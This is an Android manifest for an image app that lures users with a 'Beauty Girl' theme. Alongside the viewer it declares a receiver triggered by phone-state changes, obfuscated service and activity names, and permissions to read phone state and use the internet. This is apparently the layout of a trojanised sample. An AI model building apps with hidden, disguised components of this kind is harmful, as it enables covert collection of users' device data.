<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.Beauty.Girl">
    <application android:icon="@drawable/icon1" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name=".SexyImages">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name=".ShowImage">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
            </intent-filter>
        </activity>
        <receiver android:name=".lightdd.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="i$aq"/>
        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14da6a743093dd"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="aH$eN" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
</manifest>